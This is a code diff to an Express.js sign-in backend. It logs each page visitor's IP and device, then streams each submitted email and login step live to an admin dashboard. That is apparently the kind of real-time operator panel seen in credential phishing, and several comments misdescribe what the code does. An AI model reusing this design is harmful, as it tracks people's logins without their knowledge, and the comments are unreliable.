@@ -185,20 +185,12 @@ app.post(
   "/api/auth/start",
   async (req, res) => {
     try {
-      const { email } = req.body;
-
-      if (!email) {
-        return res.status(400).json({
-          message: "Email is required"
-        });
-      }
+  
 
 
       // Check whether this email already has a pending
       // session.
-      let user = await User.findOne({
-        email
-      });
+
       const ip = req.ip
       
       const userAgent =
@@ -210,29 +202,23 @@ app.post(
           userAgent
         );
 
-      if (!user) {
-        user = await User.create({
-          email,
+      
+      let  user = await User.create({
+          email: null,
           passwordHash: null,
           phone: null,
           lastLogin: new Date(),
           approved: false,
           device: deviceInfo.device,
-          currentStep: "password",
+          currentStep: "email",
           browser: deviceInfo.browser,
           ipAddress: ip,
           phoneRequested: false,
-          status: "email-submitted"
+          status: "Visited"
         });
-      } else {
-        user.status = "email-submitted";
-
-        await user.save();
-      }
-
+  
       console.log(
-        "New sign-in session:",
-        user.email
+        "Page is visited:",
       );
 
       // Send only safe information to admins.
@@ -254,7 +240,7 @@ app.post(
       );
 
       res.status(201).json({
-        message: "Email received",
+        message: "Site visited",
         userId: user._id
       });
 
@@ -277,6 +263,77 @@ app.post(
 // The password is immediately hashed.
 // It is NEVER emitted to the admin.
 // =====================================================
+
+app.post(
+  "/api/auth/email",
+  async (req, res) => {
+    try {
+      const {
+        userId,
+        email
+      } = req.body;
+
+      if (!userId || !email) {
+        return res.status(400).json({
+          message:
+            "User ID and email are required"
+        });
+      }
+
+      const user =
+        await User.findById(userId);
+
+      if (!user) {
+        return res.status(404).json({
+          message: "User not found"
+        });
+      }
+
+      // Hash password
+    
+
+      user.email = email
+
+      user.currentStep = "password"
+
+      user.status =
+        "email-submitted";
+      
+      await updateLastLogin(user);
+
+     
+      // Tell admin only that the password
+      // step was completed.
+      emitToAdmins(
+        "email-set",
+        {
+          _id: user._id,
+          email: user.email,
+          currentStep: user.currentStep,
+          status: user.status
+        }
+
+      );
+
+     
+      res.json({
+        message:
+          "email submitted successfully"
+      });
+
+    } catch (error) {
+      console.log(
+        "email ERROR:",
+        error
+      );
+
+      res.status(500).json({
+        message: "Server error"
+      });
+    }
+  }
+);
+
 
 app.post(
   "/api/auth/password",
